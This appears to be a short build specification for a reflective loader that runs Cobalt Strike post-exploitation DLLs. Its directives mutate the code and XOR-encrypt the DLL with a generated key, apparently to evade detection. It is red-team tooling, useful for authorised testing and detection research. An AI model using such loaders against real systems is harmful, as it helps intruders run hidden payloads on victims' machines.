name     "Beacon Postex Loader"
describe "Reflective loader for Cobalt Strike's postex DLLs"
author   "Daniel Duggan (@_RastaMouse)"

x64:
	load "bin/loader.x64.o"
		make pic +optimize +disco +mutate

		patch "pGetModuleHandle" $GMH
		patch "pGetProcAddress"  $GPA

		generate $KEY 8192

		push $DLL
			xor $KEY
			preplen
			link "postex_dll"

		push $KEY
			preplen
			link "xor_key"
	
	export
